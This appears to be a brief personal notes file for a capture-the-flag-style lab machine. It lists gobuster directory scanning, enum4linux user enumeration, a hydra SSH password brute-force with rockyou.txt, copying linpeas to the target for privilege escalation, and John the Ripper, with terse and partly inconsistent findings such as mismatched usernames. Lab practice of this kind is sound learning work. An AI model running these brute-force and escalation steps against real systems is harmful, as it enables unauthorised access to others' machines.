# Basic-Pentration-Testing
Port

GObuster  (Hidden directory on webserver ('development found ')
gobuster dir -u 10.10.111.148  --wordlist  /usr/share/wordlists/rockyou.txt 

enum4linux  ( Username "jan & "kay" found)
enum4linux/enum4linux.pl -a 10.10.111.148 | tee enum4linux.log


Hydra   (password  jay:armando found with ssh hydra)
hydra -l kay -P /usr/share/wordlists/rockyou.txt 10.10.111.148


linpeas    scp  /opt/linpeas/linpeas.sh  jan@ip:/dev/shm
( ye basically install hoti hy apni machine me phr ssh se target machine me)


john the ripper
